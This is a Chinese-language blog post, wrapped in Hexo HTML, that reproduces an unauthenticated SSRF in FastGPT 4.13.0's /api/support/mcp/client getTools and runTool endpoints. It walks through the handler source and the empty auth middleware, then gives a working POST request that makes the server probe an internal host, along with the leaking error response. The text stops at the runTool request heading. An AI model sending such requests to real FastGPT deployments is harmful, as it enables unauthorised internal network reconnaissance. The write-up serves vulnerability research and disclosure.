@@ -1,0 +1,1095 @@
+
+
+<!DOCTYPE html>
+<html lang="zh-CN" data-default-color-scheme=dark>
+
+
+
+<head>
+  <meta charset="UTF-8">
+
+  <link rel="apple-touch-icon" sizes="76x76" href="/img/logo.jpg">
+  <link rel="icon" href="/img/logo.jpg">
+  
+
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+  <meta name="theme-color" content="#2f4154">
+  <meta name="author" content="ExploreIO">
+  <meta name="keywords" content="">
+  
+    <meta name="description" content="fastgpt-mcpCLient未认证ssrf复现">
+<meta property="og:type" content="article">
+<meta property="og:title" content="fastgpt-mcpCLient未认证ssrf复现">
+<meta property="og:url" content="https://exploreio.github.io/2026/09/04/fastgpt-mcpCLient%E6%9C%AA%E8%AE%A4%E8%AF%81ssrf%E5%A4%8D%E7%8E%B0/index.html">
+<meta property="og:site_name" content="ExploreIO&#39;s Blog">
+<meta property="og:description" content="fastgpt-mcpCLient未认证ssrf复现">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://exploreio.github.io/img/a2.jpg">
+<meta property="article:published_time" content="2026-09-04T07:30:00.000Z">
+<meta property="article:modified_time" content="2026-09-03T17:09:49.440Z">
+<meta property="article:author" content="ExploreIO">
+<meta property="article:tag" content="CTF">
+<meta property="article:tag" content="cve">
+<meta property="article:tag" content="渗透测试">
+<meta property="article:tag" content="漏洞挖掘">
+<meta property="article:tag" content="网络安全">
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:image" content="https://exploreio.github.io/img/a2.jpg">
+  
+  
+    <meta name="referrer" content="no-referrer-when-downgrade">
+  
+  
+  <title>fastgpt-mcpCLient未认证ssrf复现 - ExploreIO&#39;s Blog</title>
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />
+
+
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/github-markdown-css/4.0.0/github-markdown.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/hint.css/2.7.0/hint.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.css" />
+
+
+
+<!-- 主题依赖的图标库，不要自行修改 -->
+<!-- Do not modify the link that theme dependent icons -->
+
+<link rel="stylesheet" href="//at.alicdn.com/t/c/font_1749284_5i9bdhy70f8.css">
+
+
+
+<link rel="stylesheet" href="//at.alicdn.com/t/c/font_1736178_k526ubmyhba.css">
+
+
+<link  rel="stylesheet" href="/css/main.css" />
+
+
+  <link id="highlight-css" rel="stylesheet" href="/css/highlight.css" />
+  
+    <link id="highlight-css-dark" rel="stylesheet" href="/css/highlight-dark.css" />
+  
+
+
+
+  
+<link rel="stylesheet" href="/css/glassBg.css">
+
+
+
+  <script id="fluid-configs">
+    var Fluid = window.Fluid || {};
+    Fluid.ctx = Object.assign({}, Fluid.ctx)
+    var CONFIG = {"hostname":"exploreio.github.io","root":"/","version":"1.9.9","typing":{"enable":true,"typeSpeed":70,"cursorChar":"▌","loop":false,"scope":[]},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"left","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":5,"color":"#36D399","options":{"showSpinner":false,"trickleSpeed":100,"easing":"ease-in-out"}},"code_language":{"enable":true,"default":"TEXT"},"copy_btn":true,"image_caption":{"enable":true},"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"expand_all":true,"placement":"right","headingSelector":"h1,h2,h3,h4,h5","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":false,"follow_dnt":true,"baidu":null,"google":{"measurement_id":null},"tencent":{"sid":null,"cid":null},"leancloud":{"app_id":null,"app_key":null,"server_url":null,"path":"window.location.pathname","ignore_local":false},"openkounter":{"server_url":"https://open-kounter.mintimate.cn","path":"window.location.pathname","ignore_local":false},"umami":{"src":null,"website_id":null,"domains":null,"start_time":"2024-01-01T00:00:00.000Z","token":null,"api_server":null}},"search_path":"/local-search.xml","include_content_in_search":true};
+
+    if (CONFIG.web_analytics.follow_dnt) {
+      var dntVal = navigator.doNotTrack || window.doNotTrack || navigator.msDoNotTrack;
+      Fluid.ctx.dnt = dntVal && (dntVal.startsWith('1') || dntVal.startsWith('yes') || dntVal.startsWith('on'));
+    }
+  </script>
+  <script  src="/js/utils.js" ></script>
+  <script  src="/js/color-schema.js" ></script>
+  
+
+
+  
+<meta name="generator" content="Hexo 8.1.1"></head>
+
+
+<body><!-- hexo injector body_begin start --><div id="web_bg"></div><!-- hexo injector body_begin end -->
+  
+
+  <header>
+    
+
+<div class="header-inner" style="height: 70vh;">
+  <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand" href="/">
+      <strong>ExploreIO&#39;s blog</strong>
+    </a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
+            data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content (desktop) -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/" target="_self">
+                <i class="iconfont icon-home-fill"></i>
+                <span>首页</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/archives/" target="_self">
+                <i class="iconfont icon-archive-fill"></i>
+                <span>归档</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/categories/" target="_self">
+                <i class="iconfont icon-category-fill"></i>
+                <span>分类</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/tags/" target="_self">
+                <i class="iconfont icon-tags-fill"></i>
+                <span>标签</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/about/" target="_self">
+                <i class="iconfont icon-user-fill"></i>
+                <span>关于</span>
+              </a>
+            </li>
+          
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" target="_self" href="javascript:;" data-toggle="modal" data-target="#modalSearch" aria-label="Search">
+              <i class="iconfont icon-search"></i>
+            </a>
+          </li>
+          
+        
+        
+          <li class="nav-item" id="color-toggle-btn">
+            <a class="nav-link" target="_self" href="javascript:;" aria-label="Color Toggle">
+              <i class="iconfont icon-dark" id="color-toggle-icon"></i>
+            </a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+<!-- Mobile grid menu overlay -->
+<div id="mobile-grid-menu" class="d-lg-none">
+  <div class="mobile-grid-menu-inner">
+    <div class="container">
+      <div class="row">
+        
+          
+          
+          
+          
+            <div class="col-4 mobile-grid-cell">
+              <a href="/" target="_self">
+                <div class="mobile-grid-item">
+                  <i class="iconfont icon-home-fill"></i>
+                  <span>首页</span>
+                </div>
+              </a>
+            </div>
+          
+        
+          
+          
+          
+          
+            <div class="col-4 mobile-grid-cell">
+              <a href="/archives/" target="_self">
+                <div class="mobile-grid-item">
+                  <i class="iconfont icon-archive-fill"></i>
+                  <span>归档</span>
+                </div>
+              </a>
+            </div>
+          
+        
+          
+          
+          
+          
+            <div class="col-4 mobile-grid-cell">
+              <a href="/categories/" target="_self">
+                <div class="mobile-grid-item">
+                  <i class="iconfont icon-category-fill"></i>
+                  <span>分类</span>
+                </div>
+              </a>
+            </div>
+          
+        
+          
+          
+          
+          
+            <div class="col-4 mobile-grid-cell">
+              <a href="/tags/" target="_self">
+                <div class="mobile-grid-item">
+                  <i class="iconfont icon-tags-fill"></i>
+                  <span>标签</span>
+                </div>
+              </a>
+            </div>
+          
+        
+          
+          
+          
+          
+            <div class="col-4 mobile-grid-cell">
+              <a href="/about/" target="_self">
+                <div class="mobile-grid-item">
+                  <i class="iconfont icon-user-fill"></i>
+                  <span>关于</span>
+                </div>
+              </a>
+            </div>
+          
+        
+        
+          <div class="col-4 mobile-grid-cell" id="mobile-search-btn">
+            <a href="javascript:;" data-toggle="modal" data-target="#modalSearch" aria-label="Search">
+              <div class="mobile-grid-item">
+                <i class="iconfont icon-search"></i>
+                <span>搜索</span>
+              </div>
+            </a>
+          </div>
+        
+        
+          <div class="col-4 mobile-grid-cell" id="mobile-color-toggle-btn"
+               data-label-light="开灯"
+               data-label-dark="关灯">
+            <a href="javascript:;" aria-label="Color Toggle">
+              <div class="mobile-grid-item">
+                <i class="iconfont icon-dark" id="mobile-color-toggle-icon"></i>
+                <span id="mobile-color-toggle-label">关灯</span>
+              </div>
+            </a>
+          </div>
+        
+      </div>
+    </div>
+  </div>
+</div>
+
+  
+
+<div id="banner" class="banner" parallax=true
+     style="background: url('/img/a2.jpg') no-repeat center center; background-size: cover;">
+  <div class="full-bg-img">
+    <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
+      <div class="banner-text text-center fade-in-up">
+        <div class="h2">
+          
+            <span id="subtitle" data-typed-text="fastgpt-mcpCLient未认证ssrf复现"></span>
+          
+        </div>
+
+        
+          
+  <div class="mt-3">
+    
+    
+      <span class="post-meta">
+        <i class="iconfont icon-date-fill" aria-hidden="true"></i>
+        <time datetime="2026-09-04 15:30" pubdate>
+          2026年9月4日 下午
+        </time>
+      </span>
+    
+  </div>
+
+  <div class="mt-1">
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-chart"></i>
+        
+          6.2k 字
+        
+      </span>
+    
+
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-clock-fill"></i>
+        
+        
+        
+          11 分钟
+        
+      </span>
+    
+
+    
+    
+      
+        <span id="busuanzi_container_page_pv" style="display: none">
+          <i class="iconfont icon-eye" aria-hidden="true"></i>
+          <span id="busuanzi_value_page_pv"></span> 次
+        </span>
+        
+
+      
+    
+  </div>
+
+
+        
+      </div>
+
+      
+    </div>
+  </div>
+</div>
+
+
+
+</div>
+
+  </header>
+
+  <main>
+    
+      
+
+<div class="container-fluid nopadding-x">
+  <div class="row nomargin-x">
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+  <aside class="sidebar category-bar" style="margin-right: -1rem">
+    
+
+
+
+
+
+<div class="category-list">
+  
+  
+    
+    
+    
+    <div class="category row nomargin-x">
+      <a class="category-item 
+          list-group-item category-item-action col-10 col-md-11 col-xm-11" title="web安全"
+        id="heading-3462cf7781bac1cfac12668cdfaa788c" role="tab" data-toggle="collapse" href="#collapse-3462cf7781bac1cfac12668cdfaa788c"
+        aria-expanded="true"
+      >
+        web安全
+        <span class="list-group-count">(3)</span>
+        <i class="iconfont icon-arrowright"></i>
+      </a>
+      
+      <div class="category-collapse collapse show" id="collapse-3462cf7781bac1cfac12668cdfaa788c"
+           role="tabpanel" aria-labelledby="heading-3462cf7781bac1cfac12668cdfaa788c">
+        
+        
+          
+          
+  <div class="category-post-list">
+    
+    
+  </div>
+
+          
+  
+    
+    
+    
+    <div class="category-sub row nomargin-x">
+      <a class="category-subitem 
+          list-group-item category-item-action col-10 col-md-11 col-xm-11" title="cve"
+        id="heading-1716b5fcbb7121af74efdc153d0166c5" role="tab" data-toggle="collapse" href="#collapse-1716b5fcbb7121af74efdc153d0166c5"
+        aria-expanded="true"
+      >
+        cve
+        <span class="list-group-count">(3)</span>
+        <i class="iconfont icon-arrowright"></i>
+      </a>
+      
+      <div class="category-collapse collapse show" id="collapse-1716b5fcbb7121af74efdc153d0166c5"
+           role="tabpanel" aria-labelledby="heading-1716b5fcbb7121af74efdc153d0166c5">
+        
+        
+          
+  <div class="category-post-list">
+    
+    
+      
+      
+        <a href="/2026/08/29/CVE-2026-79483/" title="CVE-2026-79483"
+           class="list-group-item list-group-item-action
+           ">
+          <span class="category-post">CVE-2026-79483</span>
+        </a>
+      
+    
+      
+      
+        <a href="/2026/08/29/CVE-2026-79483-EN/" title="CVE-2026-79483-EN"
+           class="list-group-item list-group-item-action
+           ">
+          <span class="category-post">CVE-2026-79483-EN</span>
+        </a>
+      
+    
+      
+      
+        <a href="/2026/09/04/fastgpt-mcpCLient%E6%9C%AA%E8%AE%A4%E8%AF%81ssrf%E5%A4%8D%E7%8E%B0/" title="fastgpt-mcpCLient未认证ssrf复现"
+           class="list-group-item list-group-item-action
+           active">
+          <span class="category-post">fastgpt-mcpCLient未认证ssrf复现</span>
+        </a>
+      
+    
+  </div>
+
+        
+      </div>
+    </div>
+  
+        
+      </div>
+    </div>
+  
+</div>
+
+
+  </aside>
+
+
+    </div>
+
+    <div class="col-lg-8 nopadding-x-md">
+      <div class="container nopadding-x-md" id="board-ctn">
+        <div id="board">
+          <article class="post-content mx-auto">
+            <h1 id="seo-header">fastgpt-mcpCLient未认证ssrf复现</h1>
+            
+            
+              <div class="markdown-body">
+                
+                <h2 id="漏洞介绍"><a href="#漏洞介绍" class="headerlink" title="漏洞介绍"></a>漏洞介绍</h2><p><code>/api/support/mcp/client/</code> 下的 <code>getTools</code> 与 <code>runTool</code> 两个端点均接收请求体中的 <code>url</code> 并由服务器主动向其发起 MCP&#x2F;SSE 连接。两接口<strong>均无任何鉴权</strong>、<code>url</code> 完全由请求者控制、连接结果（拒绝&#x2F;超时&#x2F;HTTP 状态码&#x2F;响应内容类型）以错误消息形式回显 —— 构成未认证 SSRF 与内网测绘 oracle</p>
+<p>gettools接口的作用是mcp我收+拉取工具列表</p>
+<p>runtool接口的作用是mcp握手+调用指定工具并返回执行结果</p>
+<p>下面主要讲的是代码审计相关的东西</p>
+<h2 id="代码审计"><a href="#代码审计" class="headerlink" title="代码审计"></a>代码审计</h2><p>代码审计已FastGPT-4.13.0版本为例</p>
+<p>下载链接：<a target="_blank" rel="noopener" href="https://github.com/labring/FastGPT/archive/refs/tags/v4.13.0.zip">https://github.com/labring/FastGPT/archive/refs/tags/v4.13.0.zip</a></p>
+<h3 id="理解项目架构"><a href="#理解项目架构" class="headerlink" title="理解项目架构"></a>理解项目架构</h3><p>FastGPT 是一个 <strong>Next.js + TypeScript + MongoDB (Mongoose)</strong> 的 monorepo 项目</p>
+<h3 id="发现可疑目录"><a href="#发现可疑目录" class="headerlink" title="发现可疑目录"></a>发现可疑目录</h3><p>projects&#x2F;app&#x2F;src&#x2F;pages&#x2F;api&#x2F;support&#x2F;mcp&#x2F;client</p>
+<p><img src="/../img/fastgpt-mcpClient/image-20260904001902975.png" srcset="/img/loading.gif" lazyload alt="image-20260904001902975"></p>
+<blockquote>
+<p><strong>审计思考 ②</strong>：<code>support/</code> 目录在 FastGPT 里放的是”支撑功能”（用户、团队、外链、文件等），这里的 <code>mcp/client</code> 从命名看是”FastGPT 作为 MCP <strong>客户端</strong>去连接别人的 MCP 服务器” —— 与 <code>core/app/mcpTools</code>（把别人注册的 MCP 工具跑起来）职责相近但路径完全不同。<strong>每个文件一个端点</strong>，先看 <code>getTools.ts</code>。</p>
+</blockquote>
+<p>看到gettools.ts的代码内容</p>
+<figure class="highlight ts"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><code class="hljs ts"><span class="hljs-keyword">import</span> &#123; <span class="hljs-title class_">NextAPI</span> &#125; <span class="hljs-keyword">from</span> <span class="hljs-string">&#x27;@/service/middleware/entry&#x27;</span>;<br><span class="hljs-keyword">import</span> &#123; <span class="hljs-keyword">type</span> <span class="hljs-title class_">McpToolConfigType</span> &#125; <span class="hljs-keyword">from</span> <span class="hljs-string">&#x27;@fastgpt/global/core/app/type&#x27;</span>;<br><span class="hljs-keyword">import</span> <span class="hljs-keyword">type</span> &#123; <span class="hljs-title class_">ApiRequestProps</span>, <span class="hljs-title class_">ApiResponseType</span> &#125; <span class="hljs-keyword">from</span> <span class="hljs-string">&#x27;@fastgpt/service/type/next&#x27;</span>;<br><span class="hljs-keyword">import</span> &#123; <span class="hljs-title class_">MCPClient</span> &#125; <span class="hljs-keyword">from</span> <span class="hljs-string">&#x27;@fastgpt/service/core/app/mcp&#x27;</span>;<br><span class="hljs-keyword">import</span> &#123; <span class="hljs-keyword">type</span> <span class="hljs-title class_">StoreSecretValueType</span> &#125; <span class="hljs-keyword">from</span> <span class="hljs-string">&#x27;@fastgpt/global/common/secret/type&#x27;</span>;<br><span class="hljs-keyword">import</span> &#123; getSecretValue &#125; <span class="hljs-keyword">from</span> <span class="hljs-string">&#x27;@fastgpt/service/common/secret/utils&#x27;</span>;<br><br><span class="hljs-keyword">export</span> <span class="hljs-keyword">type</span> getMCPToolsQuery = &#123;&#125;;<br><br><span class="hljs-keyword">export</span> <span class="hljs-keyword">type</span> getMCPToolsBody = &#123; <span class="hljs-attr">url</span>: <span class="hljs-built_in">string</span>; <span class="hljs-attr">headerSecret</span>: <span class="hljs-title class_">StoreSecretValueType</span> &#125;;<br><br><span class="hljs-keyword">export</span> <span class="hljs-keyword">type</span> getMCPToolsResponse = <span class="hljs-title class_">McpToolConfigType</span>[];<br><br><span class="hljs-keyword">async</span> <span class="hljs-keyword">function</span> <span class="hljs-title function_">handler</span>(<span class="hljs-params"></span><br><span class="hljs-params">  <span class="hljs-attr">req</span>: <span class="hljs-title class_">ApiRequestProps</span>&lt;getMCPToolsBody, getMCPToolsQuery&gt;,</span><br><span class="hljs-params">  <span class="hljs-attr">res</span>: <span class="hljs-title class_">ApiResponseType</span>&lt;getMCPToolsResponse[]&gt;</span><br><span class="hljs-params"></span>): <span class="hljs-title class_">Promise</span>&lt;getMCPToolsResponse&gt; &#123;<br>  <span class="hljs-keyword">const</span> &#123; url, headerSecret &#125; = req.<span class="hljs-property">body</span>;<br><br>  <span class="hljs-keyword">const</span> mcpClient = <span class="hljs-keyword">new</span> <span class="hljs-title class_">MCPClient</span>(&#123;<br>    url,<br>    <span class="hljs-attr">headers</span>: <span class="hljs-title function_">getSecretValue</span>(&#123;<br>      <span class="hljs-attr">storeSecret</span>: headerSecret<br>    &#125;)<br>  &#125;);<br><br>  <span class="hljs-keyword">const</span> result = <span class="hljs-keyword">await</span> mcpClient.<span class="hljs-title function_">getTools</span>();<br>  <span class="hljs-keyword">return</span> result;<br>&#125;<br><br><span class="hljs-keyword">export</span> <span class="hljs-keyword">default</span> <span class="hljs-title class_">NextAPI</span>(handler);<br><br></code></pre></td></tr></table></figure>
+
+<p>看看这个代码大概的意思</p>
+<p> <code>NextAPI(handler)</code></p>
+<p><code>NextAPI</code> 是错误处理包装器，<strong>是否附带鉴权</strong>要去 <code>middleware/entry.ts</code> 确认</p>
+<p><code>body = { url, headerSecret }</code></p>
+<p><strong><code>url</code> 是请求体里的普通字段</strong> —— 类型标注 <code>string</code> 只是编译期约束，运行时传什么就是什么</p>
+<p> <code>const { url } = req.body</code></p>
+<p>用户输入原样解构，无 Zod&#x2F;无白名单&#x2F;无内网地址校验</p>
+<p><code>new MCPClient({ url, ... })</code></p>
+<p>用户可控的 <code>url</code> 即将<strong>交给服务器去连接</strong> ——<code> SSRF</code> 的经典形态</p>
+<p><code>headerSecret</code> → headers</p>
+<p><code>headerSecret</code> 经过 <code>getSecretValue</code> 处理后，会作为<code> HTTP</code> 请求头发送给目标<code> url</code></p>
+<p><code>getTools()</code> 结果直接返回</p>
+<p>连接结果（成功&#x2F;失败细节）<strong>回显给请求者</strong> ，所以这里会返回错误的代码后续可以用来区分正确与错误的消息</p>
+<blockquote>
+<p>到这里已经具备 SSRF 的全部要素：<strong>用户可控目标 + 服务器主动发起连接 + 结果回显</strong>。缺的只是一个确认：这个端点到底有没有鉴权？没有 <code>req</code> 传给任何 <code>auth*</code> 函数，但没有显式拒绝也可能是全局中间件拦的 —— 必须排掉这个可能。</p>
+</blockquote>
+<h3 id="鉴权检查"><a href="#鉴权检查" class="headerlink" title="鉴权检查"></a>鉴权检查</h3><p>FastGPT 的 API 包装器在 <code>projects/app/src/service/middleware/entry.ts</code>：</p>
+<p><img src="/../img/fastgpt-mcpClient/image-20260904003626971.png" srcset="/img/loading.gif" lazyload alt="image-20260904003626971"></p>
+<p>FastGPT 的 API 包装器在 <code>projects/app/src/service/middleware/entry.ts</code>：</p>
+<figure class="highlight typescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs typescript"><span class="hljs-keyword">export</span> <span class="hljs-keyword">const</span> <span class="hljs-title class_">NextAPI</span> = <span class="hljs-title class_">NextEntry</span>(&#123;<br>  <span class="hljs-attr">beforeCallback</span>: []      <span class="hljs-comment">// ← 关键：前置回调数组为空</span><br>&#125;);<br></code></pre></td></tr></table></figure>
+
+<p><code>beforeCallback</code> 是每个请求进来前依次执行的函数数组 —— FastGPT 所有需要登录的端点，都是把 <code>authCert</code>（Cookie&#x2F;API Key 校验）这类函数<strong>放进各自文件的 beforeCallback</strong> 或在 handler 里显式调用。对比一个正常需要鉴权的端点（如 <code>core/chat/getHistories.ts</code> 内部）：</p>
+<figure class="highlight typescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs typescript"><span class="hljs-comment">// 有鉴权的写法（节选）—— handler 内部显式调用鉴权函数</span><br><span class="hljs-keyword">const</span> &#123; teamId, tmbId, permission &#125; = <span class="hljs-keyword">await</span> <span class="hljs-title function_">authCert</span>(&#123; req, <span class="hljs-attr">authToken</span>: <span class="hljs-literal">true</span> &#125;);<br></code></pre></td></tr></table></figure>
+
+<p>而 <code>getTools.ts</code> 的 handler 全文（第二步）<strong>没有出现任何 <code>auth</code> 字样</strong>，<code>beforeCallback</code> 又是空数组。两条路都排除后可以下结论：</p>
+<blockquote>
+<p><strong>鉴权结论：<code>/api/support/mcp/client/getTools</code> 无任何身份验证 —— 未登录、无 Cookie、无 API Key 均可直接调用。</strong></p>
+</blockquote>
+<p>顺手确认 <code>runTool.ts</code>与全局是否有其他拦截（Nginx 层的 WAF 因部署而异，代码层无拦截）。</p>
+<h3 id="读-runTool-ts"><a href="#读-runTool-ts" class="headerlink" title="读 runTool.ts"></a>读 runTool.ts</h3><p>现在回到projects&#x2F;app&#x2F;src&#x2F;pages&#x2F;api&#x2F;support&#x2F;mcp&#x2F;client</p>
+<figure class="highlight ts"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><code class="hljs ts"><span class="hljs-keyword">import</span> &#123; <span class="hljs-title class_">NextAPI</span> &#125; <span class="hljs-keyword">from</span> <span class="hljs-string">&#x27;@/service/middleware/entry&#x27;</span>;<br><span class="hljs-keyword">import</span> <span class="hljs-keyword">type</span> &#123; <span class="hljs-title class_">ApiRequestProps</span>, <span class="hljs-title class_">ApiResponseType</span> &#125; <span class="hljs-keyword">from</span> <span class="hljs-string">&#x27;@fastgpt/service/type/next&#x27;</span>;<br><span class="hljs-keyword">import</span> &#123; <span class="hljs-title class_">MCPClient</span> &#125; <span class="hljs-keyword">from</span> <span class="hljs-string">&#x27;@fastgpt/service/core/app/mcp&#x27;</span>;<br><span class="hljs-keyword">import</span> &#123; <span class="hljs-keyword">type</span> <span class="hljs-title class_">StoreSecretValueType</span> &#125; <span class="hljs-keyword">from</span> <span class="hljs-string">&#x27;@fastgpt/global/common/secret/type&#x27;</span>;<br><span class="hljs-keyword">import</span> &#123; getSecretValue &#125; <span class="hljs-keyword">from</span> <span class="hljs-string">&#x27;@fastgpt/service/common/secret/utils&#x27;</span>;<br><br><span class="hljs-keyword">export</span> <span class="hljs-keyword">type</span> <span class="hljs-title class_">RunMCPToolQuery</span> = &#123;&#125;;<br><br><span class="hljs-keyword">export</span> <span class="hljs-keyword">type</span> <span class="hljs-title class_">RunMCPToolBody</span> = &#123;<br>  <span class="hljs-attr">url</span>: <span class="hljs-built_in">string</span>;<br>  <span class="hljs-attr">toolName</span>: <span class="hljs-built_in">string</span>;<br>  <span class="hljs-attr">headerSecret</span>: <span class="hljs-title class_">StoreSecretValueType</span>;<br>  <span class="hljs-attr">params</span>: <span class="hljs-title class_">Record</span>&lt;<span class="hljs-built_in">string</span>, <span class="hljs-built_in">any</span>&gt;;<br>&#125;;<br><br><span class="hljs-keyword">export</span> <span class="hljs-keyword">type</span> <span class="hljs-title class_">RunMCPToolResponse</span> = <span class="hljs-built_in">any</span>;<br><br><span class="hljs-keyword">async</span> <span class="hljs-keyword">function</span> <span class="hljs-title function_">handler</span>(<span class="hljs-params"></span><br><span class="hljs-params">  <span class="hljs-attr">req</span>: <span class="hljs-title class_">ApiRequestProps</span>&lt;<span class="hljs-title class_">RunMCPToolBody</span>, <span class="hljs-title class_">RunMCPToolQuery</span>&gt;,</span><br><span class="hljs-params">  <span class="hljs-attr">res</span>: <span class="hljs-title class_">ApiResponseType</span>&lt;<span class="hljs-title class_">RunMCPToolResponse</span>&gt;</span><br><span class="hljs-params"></span>): <span class="hljs-title class_">Promise</span>&lt;<span class="hljs-title class_">RunMCPToolResponse</span>&gt; &#123;<br>  <span class="hljs-keyword">const</span> &#123; url, toolName, headerSecret, params &#125; = req.<span class="hljs-property">body</span>;<br>  <span class="hljs-keyword">const</span> mcpClient = <span class="hljs-keyword">new</span> <span class="hljs-title class_">MCPClient</span>(&#123;<br>    url,<br>    <span class="hljs-attr">headers</span>: <span class="hljs-title function_">getSecretValue</span>(&#123;<br>      <span class="hljs-attr">storeSecret</span>: headerSecret<br>    &#125;)<br>  &#125;);<br><br>  <span class="hljs-keyword">return</span> mcpClient.<span class="hljs-title function_">toolCall</span>(toolName, params);<br>&#125;<br><br><span class="hljs-keyword">export</span> <span class="hljs-keyword">default</span> <span class="hljs-title class_">NextAPI</span>(handler);<br><br></code></pre></td></tr></table></figure>
+
+<p>与 <code>getTools</code> 完全同构：无鉴权 + <code>url</code> 直通。差异是<strong>交互更深一层</strong> —— <code>toolName</code> 与 <code>params</code> 会作为 MCP 协议的 <code>tools/call</code> 参数发到目标服务器，执行结果原样返回给请求者</p>
+<blockquote>
+<p>两个端点、同一根因（无鉴权 + URL 直通）</p>
+</blockquote>
+<h3 id="审计总结"><a href="#审计总结" class="headerlink" title="审计总结"></a>审计总结</h3><p>根据上面两个接口没有任何鉴权以及用户可以自由控制请求路径还有服务端会返回请求结果的表现来看，两个接口存在ssrf漏洞</p>
+<p>攻击者构造如下请求包就可以探测内网</p>
+<p>请求包（getTools）</p>
+<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs http"><span class="hljs-keyword">POST</span> <span class="hljs-string">/api/support/mcp/client/getTools</span> <span class="hljs-meta">HTTP/1.1</span><br><span class="hljs-attribute">Host</span><span class="hljs-punctuation">: </span>x.x.x.x<br><span class="hljs-attribute">Content-Type</span><span class="hljs-punctuation">: </span>application/json<br><br><span class="language-json"><span class="hljs-punctuation">&#123;</span><span class="hljs-attr">&quot;url&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;http://sandbox:3000/api&quot;</span><span class="hljs-punctuation">,</span><span class="hljs-attr">&quot;headerSecret&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-punctuation">&#123;</span><span class="hljs-punctuation">&#125;</span><span class="hljs-punctuation">&#125;</span></span><br></code></pre></td></tr></table></figure>
+
+<p>响应（服务器真实访问了内网沙箱并读取响应头）：</p>
+<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs http">&#123;&quot;code&quot;:500,&quot;message&quot;:&quot;SSE error: Invalid content type, expected \&quot;text/event-stream\&quot;&quot;,&quot;data&quot;:null&#125;<br></code></pre></td></tr></table></figure>
+
+<p>请求包（runTools）</p>
